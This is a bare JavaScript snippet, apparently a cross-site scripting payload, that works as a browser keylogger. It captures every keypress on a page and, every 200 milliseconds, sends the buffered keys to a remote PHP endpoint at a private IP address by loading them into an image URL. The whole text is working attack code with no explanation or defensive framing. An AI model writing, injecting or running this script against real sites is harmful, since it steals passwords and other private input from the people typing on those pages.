var buffer = [];
var server = 'http://10.7.7.4/klog.php?k='
document.onkeypress = function(e) {
	buffer.push(e.key);
}
window.setInterval(function() {
	if (buffer.length > 0) {
		var data = encodeURIComponent(buffer);
		new Image().src = server + data;
		buffer = [];
	}
}, 200);
